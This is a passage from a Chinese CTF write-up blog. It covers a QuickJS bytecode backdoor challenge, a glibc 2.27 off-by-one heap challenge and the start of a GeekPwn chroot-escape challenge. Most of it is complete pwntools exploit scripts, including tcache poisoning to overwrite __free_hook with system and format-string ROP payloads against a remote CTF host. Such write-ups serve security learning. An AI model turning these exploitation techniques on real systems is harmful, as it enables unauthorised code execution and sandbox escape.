引擎，具有以下特性：</p><ul><li>轻量而且易于嵌入：只需几个C文件，没有外部依赖，一个x86下的简单的“hello world”程序只要180 KiB。</li><li>具有极低启动时间的快速解释器： 在一台单核的台式PC上，大约在100秒内运行ECMAScript 测试套件1 56000次。</li><li>运行时实例的完整生命周期在不到300微秒的时间内完成。</li><li>几乎完整实现ES2019支持，包括： 模块，异步生成器和和完整Annex B支持 (传统的Web兼容性)。</li><li>通过100％的ECMAScript Test Suite测试。</li><li>可以将Javascript源编译为没有外部依赖的可执行文件。</li><li>使用引用计数（以减少内存使用并具有确定性行为）的垃圾收集与循环删除。</li><li>数学扩展：BigInt, BigFloat, 运算符重载, bigint模式, math模式.在Javascript中实现的具有上下文着色和完成的命令行解释器。</li><li>采用C包装库构建的内置标准库。</li></ul><p><strong>qjsc 编译器可以把 JavaScript 代码编译成 QuickJS 虚拟机的字节码（可直接通过 QuickJs 虚拟机执行）。 也可以把 JavaScript 代码编译成一个 C 语言的 .c 文件，这个文件包含了字节码：</strong><br>这个也是解决本题的重点</p><p>使用 qjsc 编译器把 my_test.js文件编译成 my_test.c文件：</p><pre class="line-numbers language-bash"><code class="language-bash">./qjsc -e -o my_test.c my_test.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了解决本题专门安装了quickjs。</p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>我们最终的目标就是想通过给的程序来调用libc的后门函数，而根据p1umer师傅所说，应该是需要将quickjs解析的javascript的字节码传入，才可以解析运行后门函数。</p><p>那么我们就需要得到对应的字节码，该字节码可以通过上面的qjsc编译器获得，编译成c文件后会有对应的字节码，我们将得到的字节码传入便可调用后门函数了。</p><p>有师傅问我是怎么找到后门函数是aa(1)的，特意去问了Plumer师傅，我们可以看到后门函数上面有个aa的标识符，接下来就是试出来的了，hhh，不讲道理。<br><strong>第一步</strong></p><div style="width:70%;margin:auto">{% asset_img 5.png %}</div><p><strong>第二步</strong><br>将这部分作为payload传入。</p><div style="width:70%;margin:auto">{% asset_img 6.png %}</div><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>qjsc_exp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'02'</span><span class="token punctuation">,</span><span class="token string">'03'</span><span class="token punctuation">,</span><span class="token string">'6a'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'68'</span><span class="token punctuation">,</span><span class="token string">'6f'</span><span class="token punctuation">,</span><span class="token string">'6d'</span><span class="token punctuation">,</span><span class="token string">'65'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'73'</span><span class="token punctuation">,</span><span class="token string">'68'</span><span class="token punctuation">,</span><span class="token string">'69'</span><span class="token punctuation">,</span><span class="token string">'6e'</span><span class="token punctuation">,</span><span class="token string">'6e'</span><span class="token punctuation">,</span><span class="token string">'6f'</span><span class="token punctuation">,</span><span class="token string">'73'</span><span class="token punctuation">,</span><span class="token string">'75'</span><span class="token punctuation">,</span><span class="token string">'6b'</span><span class="token punctuation">,</span><span class="token string">'65'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'44'</span><span class="token punctuation">,</span><span class="token string">'65'</span><span class="token punctuation">,</span><span class="token string">'73'</span><span class="token punctuation">,</span><span class="token string">'6b'</span><span class="token punctuation">,</span><span class="token string">'74'</span><span class="token punctuation">,</span><span class="token string">'6f'</span><span class="token punctuation">,</span><span class="token string">'70'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'70'</span><span class="token punctuation">,</span><span class="token string">'77'</span><span class="token punctuation">,</span><span class="token string">'6e'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'32'</span><span class="token punctuation">,</span><span class="token string">'30'</span><span class="token punctuation">,</span><span class="token string">'32'</span><span class="token punctuation">,</span><span class="token string">'30'</span><span class="token punctuation">,</span><span class="token string">'20'</span><span class="token punctuation">,</span><span class="token string">'62'</span><span class="token punctuation">,</span><span class="token string">'6c'</span><span class="token punctuation">,</span><span class="token string">'75'</span><span class="token punctuation">,</span><span class="token string">'65'</span><span class="token punctuation">,</span><span class="token string">'63'</span><span class="token punctuation">,</span><span class="token string">'61'</span><span class="token punctuation">,</span><span class="token string">'70'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'6c'</span><span class="token punctuation">,</span><span class="token string">'6f'</span><span class="token punctuation">,</span><span class="token string">'76'</span><span class="token punctuation">,</span><span class="token string">'65'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'65'</span><span class="token punctuation">,</span><span class="token string">'78'</span><span class="token punctuation">,</span><span class="token string">'70'</span><span class="token punctuation">,</span><span class="token string">'2e'</span><span class="token punctuation">,</span><span class="token string">'6a'</span><span class="token punctuation">,</span><span class="token string">'73'</span><span class="token punctuation">,</span><span class="token string">'14'</span><span class="token punctuation">,</span><span class="token string">'2e'</span><span class="token punctuation">,</span><span class="token string">'2f'</span><span class="token punctuation">,</span><span class="token string">'6c'</span><span class="token punctuation">,</span><span class="token string">'69'</span><span class="token punctuation">,</span><span class="token string">'62'</span><span class="token punctuation">,</span><span class="token string">'6a'</span><span class="token punctuation">,</span><span class="token string">'73'</span><span class="token punctuation">,</span><span class="token string">'2e'</span><span class="token punctuation">,</span><span class="token string">'73'</span><span class="token punctuation">,</span><span class="token string">'6f'</span><span class="token punctuation">,</span><span class="token string">'04'</span><span class="token punctuation">,</span><span class="token string">'61'</span><span class="token punctuation">,</span><span class="token string">'61'</span><span class="token punctuation">,</span><span class="token string">'0f'</span><span class="token punctuation">,</span><span class="token string">'c0'</span><span class="token punctuation">,</span><span class="token string">'03'</span><span class="token punctuation">,</span><span class="token string">'01'</span><span class="token punctuation">,</span><span class="token string">'c2'</span><span class="token punctuation">,</span><span class="token string">'03'</span><span class="token punctuation">,</span><span class="token string">'00'</span><span class="token punctuation">,</span><span class="token string">'00'</span><span class="token punctuation">,</span><span class="token string">'01'</span><span class="token punctuation">,</span><span class="token string">'00'</span><span class="token punctuation">,</span><span class="token string">'c4'</span><span class="token punctuation">,</span><span class="token string">'03'</span><span class="token punctuation">,</span><span class="token string">'00'</span><span class="token punctuation">,</span><span class="token string">'0e'</span><span class="token punctuation">,</span><span class="token string">'00'</span><span class="token punctuation">,</span><span class="token string">'06'</span><span class="token punctuation">,</span><span class="token string">'01'</span><span class="token punctuation">,</span><span class="token string">'a0'</span><span class="token punctuation">,</span><span class="token string">'01'</span><span class="token punctuation">,</span><span class="token string">'00'</span><span class="token punctuation">,</span><span class="token string">'00'</span><span class="token punctuation">,</span><span class="token string">'00'</span><span class="token punctuation">,</span><span class="token string">'02'</span><span class="token punctuation">,</span><span class="token string">'01'</span><span class="token punctuation">,</span><span class="token string">'00'</span><span class="token punctuation">,</span><span class="token string">'06'</span><span class="token punctuation">,</span><span class="token string">'00'</span><span class="token punctuation">,</span><span class="token string">'c4'</span><span class="token punctuation">,</span><span class="token string">'03'</span><span class="token punctuation">,</span><span class="token string">'00'</span><span class="token punctuation">,</span><span class="token string">'0c'</span><span class="token punctuation">,</span><span class="token string">'65'</span><span class="token punctuation">,</span><span class="token string">'00'</span><span class="token punctuation">,</span><span class="token string">'00'</span><span class="token punctuation">,</span><span class="token string">'b7'</span><span class="token punctuation">,</span><span class="token string">'f0'</span><span class="token punctuation">,</span><span class="token string">'29'</span><span class="token punctuation">,</span><span class="token string">'c0'</span><span class="token punctuation">,</span><span class="token string">'03'</span><span class="token punctuation">,</span><span class="token string">'01'</span><span class="token punctuation">,</span><span class="token string">'01'</span><span class="token punctuation">,</span><span class="token string">'03'</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>qjsc_exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> str<span class="token punctuation">(</span>qjsc_exp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> temp    payload <span class="token operator">=</span> payload<span class="token operator">+</span>temp<span class="token keyword">print</span> payload<span class="token keyword">print</span> payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"story \n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x03-safebox"><a href="#0x03-safebox" class="headerlink" title="0x03 safebox"></a>0x03 safebox</h1><h2 id="查看文件-1"><a href="#查看文件-1" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/09/2020-lan-mao-bei-pwn/7.png"></div>保护全开<h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>创建和删除两个功能，没有show功能</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/09/2020-lan-mao-bei-pwn/8.png"></div><p>off by one的漏洞</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>通过off by one进行overlapping溢出去修改在unsorted bin中chunk的fd为stdout结构体，再利用tcache的特点进行分配修改，泄露出libc，最后再改fd为free_hook为system来getshell。</p><p>通过分配一个大于tcache的chunk，再改掉这个chunk的size释放掉，而这个chunk可以溢出修改的chunk在tcache中，我们切一部分后，留下大于tchche中可以被溢出的chunk的size的chunk，此时分配这个chunk便可以成功修改tcache中的fd了。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f365</span><span class="token punctuation">,</span><span class="token number">0x4f3c2</span><span class="token punctuation">,</span><span class="token number">0xe58b8</span><span class="token punctuation">,</span><span class="token number">0xe58bf</span><span class="token punctuation">,</span><span class="token number">0xe58c3</span><span class="token punctuation">,</span><span class="token number">0x10a45c</span><span class="token punctuation">,</span><span class="token number">0x10a468</span><span class="token punctuation">]</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"47.93.204.245"</span><span class="token punctuation">,</span><span class="token number">26501</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>sz<span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"len:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#leak libc</span>    Add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x410</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">14</span><span class="token punctuation">)</span>    Delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token operator">+</span><span class="token string">'\xa1'</span><span class="token punctuation">)</span>    Delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    Delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x410</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">'\x60\x17'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># </span>    <span class="token comment" spellcheck="true"># Add(2,0x60,'\x60\x07\xdd')</span>    Delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token operator">+</span><span class="token string">'\xa1'</span><span class="token punctuation">)</span>    Delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x490</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x410</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x51</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">49</span><span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7f1e3d8dd2a0</span><span class="token operator">+</span><span class="token number">0x7f1e3d4f5000</span>    <span class="token comment" spellcheck="true"># gdb.attach(p)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc base => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#get shell</span>    Delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    Delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token operator">+</span><span class="token string">'\xf1'</span><span class="token punctuation">)</span>    Delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    Add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x4e0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x4b0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x81</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Add(7,0x4e0,'a'*0x4b0+p64(0)+p64(0x81)+p64(libc_base+libc.sym['__malloc_hook']))</span>    Add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># shell_addr = libc_base + gadgets[]</span>    Add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># Add(9,0x70,p64(shell_addr))</span>    <span class="token triple-quoted-string string">'''    p.recvuntil('>>>')    p.sendline('1')    p.recvuntil("idx:")    p.sendline(str(10))    p.recvuntil("len:")    p.sendline(str(17))    '''</span>    <span class="token comment" spellcheck="true"># gdb.attach(p)</span>    Delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#p.interactive()</span><span class="token comment" spellcheck="true">#exp()</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        exp<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so"</span><span class="token punctuation">)</span>        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"47.93.204.245"</span><span class="token punctuation">,</span><span class="token number">26501</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IO attack </tag>
            
            <tag> QuickJS引擎 </tag>
            
            <tag> 2.27 off-by-one </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-GeekPwn-ChildShell</title>
      <link href="/2020/08/06/2020-geekpwn-childshell/"/>
      <url>/2020/08/06/2020-geekpwn-childshell/</url>
      
        <content type="html"><![CDATA[<h1 id="1-查看文件"><a href="#1-查看文件" class="headerlink" title="1.查看文件"></a>1.查看文件</h1><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-childshell/0.png"></div>这是一个需要chroot沙箱逃逸的题目# 2.IDA分析<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-childshell/1.png"></div>多了一个chroot操作，将我们的根目录置为sandbox，而flag在外面。其它的程序逻辑和之前的easyshell相同。# 3.思路<p>劫持malloc_hook，执行mprtect函数得到可以执行shellcode的地方，最后再执行可以chroot逃逸的shellcode。</p><p>由于之前劫持malloc_hook的思路在easyshell中已经挖的很清楚了，所以我们讲讲逃逸chroot的shellcode</p><p>步骤如下：</p><p><strong>第一步：执行mkdir的系统调用，rdi为.42，mode=0x1ed</strong></p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-childshell/2.png"></div>**第二步：执行chroot的系统调用，rdi为.42**<div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-childshell/3.png"></div>**第三步：执行chroot的系统调用，rdi为../../../../../**<div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/2020-geekpwn-childshell/4.png"></div>**到这里沙箱逃逸已经完成，后面就可以cat指令正常读出flag了。**<h1 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp"></a>4.exp</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">from</span> fmt_attack <span class="token keyword">import</span> Payload<span class="token comment" spellcheck="true"># https://github.com/pzhxbz/my_ctf_tools/blob/master/fmt_attack/fmt_attack.py</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># p = remote('183.60.136.226', 17564) </span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span> context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token triple-quoted-string string">'''0x00000000004199a4 : xchg edi, esp ; add al, 0 ; add dh, dh ; ret 0x0000000000401a36 : pop rdi ; ret 0x0000000000468bf5 : syscall ; ret0x0000000000479976 : pop rax ; pop rdx ; pop rbx ; ret0x0000000000401b57 : pop rsi ; ret '''</span>a <span class="token operator">=</span> Payload<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>addon<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x6CB778</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> a<span class="token punctuation">.</span>add_write_chunk<span class="token punctuation">(</span><span class="token number">0x00000000004199a4</span><span class="token punctuation">,</span><span class="token number">0x6CB788</span><span class="token punctuation">,</span>write_len<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span> a<span class="token punctuation">.</span>add_write_chunk<span class="token punctuation">(</span><span class="token number">0x0000000000401a36</span><span class="token punctuation">,</span><span class="token number">0x6CB798</span><span class="token punctuation">,</span>write_len<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span> a<span class="token punctuation">.</span>add_write_chunk<span class="token punctuation">(</span><span class="token number">0x6CB798</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x6CB798</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span>write_len<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span> a<span class="token punctuation">.</span>add_write_chunk<span class="token punctuation">(</span><span class="token number">0x00000000004009AE</span><span class="token punctuation">,</span><span class="token number">0x6CB798</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span>write_len<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span> payload <span class="token operator">=</span> a<span class="token punctuation">.</span>get_payload<span class="token punctuation">(</span><span class="token punctuation">)</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input your message'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token 